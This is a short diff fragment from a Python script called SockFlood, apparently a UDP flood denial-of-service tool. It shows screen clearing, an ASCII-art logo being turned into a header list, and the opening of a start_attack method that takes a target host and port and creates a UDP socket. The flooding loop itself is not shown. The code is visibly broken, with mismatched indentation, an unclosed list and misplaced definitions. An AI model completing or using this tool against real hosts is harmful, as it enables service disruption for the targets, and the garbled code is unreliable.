@@ -14,15 +14,17 @@ init(autoreset=True)
 class SockFlood:
 	def __init__(self):
 		 os.system("cls")
-    else:
+    else: #
          os.system("clear")
+		
 attemps = 0
-Logo = """
+def display_header():
+    header_lines = [
 	╔══════╗	
 	██████  ║
     ╚══════╝
 
-"""
+  ]
     def start_attack(self,host,port=None):
 		self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 		try:
